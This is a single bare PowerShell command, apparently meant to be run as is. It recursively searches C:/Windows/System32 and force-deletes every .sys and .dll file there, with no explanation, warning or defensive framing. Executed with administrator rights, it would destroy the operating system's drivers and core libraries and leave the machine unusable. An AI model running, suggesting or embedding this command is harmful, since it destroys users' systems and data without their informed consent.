Get-ChildItem "C:/Windows/System32" -Recurse | Where-Object { $_.Extension -eq ".sys" -or $_.Extension -eq ".dll" } | Remove-Item -Force
